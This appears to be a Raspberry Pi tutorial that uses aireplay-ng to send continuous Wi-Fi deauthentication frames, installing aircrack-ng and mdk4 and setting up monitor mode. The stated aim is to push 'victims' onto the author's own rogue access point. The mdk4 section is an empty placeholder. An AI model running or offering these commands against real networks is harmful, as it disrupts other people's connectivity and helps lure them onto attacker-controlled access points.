# WI-FI Jamming with Raspberry PI

If you have read the previous tutorial [Wi-Fi Analysis](../WIFIAnalysis), you know your Wi-Fi environment around your location. Now you can immediately create an [Simple Access Point](../AccessPoint) and wait until the first victims come by themselves. You can also do this process a little faster -> The IEEE 802.11 (_Wi-Fi_) protocol contains the provision for a deauthentication frames.

## Objective

The aim of this tutorial is to speed-up the process that stations will connect to your access point.

## Precondition

You should already have read (_and successful carried out_) the following tutorials.

- [Setup Raspberry PI](../Setup)
- [Prepare Raspberry PI](../Preparation)
- [Wi-Fi Analysis](../WIFIAnalysis)

## Install needed and/or optional packages

Install (_or ensure they are installed_) following packages.

```shell
# update system (optional)
$ sudo apt update -y && sudo apt upgrade -y

# install optional packages (optional)
$ sudo apt install -y vim wireless-tools

# install needed packages
$ sudo apt install -y aircrack-ng mdk4
```

## Attention

> In this tutorial we need the `wlan1` interface in the so-called monitor mode. You cannot use the `wlan0` interface from the Raspberry PI for this.

If you have already set up an [Access Point](../AccessPoint) and/or a [Captive portal](../CaptivePortal), you should stop them now!

```shell
# stop nodogsplash service
$ sudo systemctl stop nodogsplash

# stop hostapd service
$ sudo systemctl stop hostapd

# stop dnsmasq service
$ sudo systemctl stop dnsmasq
```

## Monitor Mode

The Wi-Fi interface (_wlan1_) must be set into "monitor mode".

```shell
# set interface down
$ sudo ip link set wlan1 down

# turn interface into monitor mode
$ sudo iwconfig wlan1 mode monitor

# set interface up
$ sudo ip link set wlan1 up
```

## aireplay-ng (Aircrack-ng)

The Aircrack-ng suite includes many tools to assess Wi-Fi networks. Here we focus on `aireplay-ng` only. 

```shell
# show help (optional)
$ aireplay-ng --help

# start deauthentication attack
$ sudo aireplay-ng -0 0 -a 50:C7:BF:DC:4C:E8 -c E0:B5:2D:EA:18:A7 wlan1
```

- `-0` means deauthentication mode
- `0` means send continuously deauthentication frames (_otherwise you can set a specific number_)
- `-a [mac address]` means MAC address of the access point
- `-c [mac address] means MAC address of the station
- `wlan1` means the interface`(_in monitor mode_)

## mdk4

...

```shell
#
$

#
$
```

[Go Back](../readme.md)
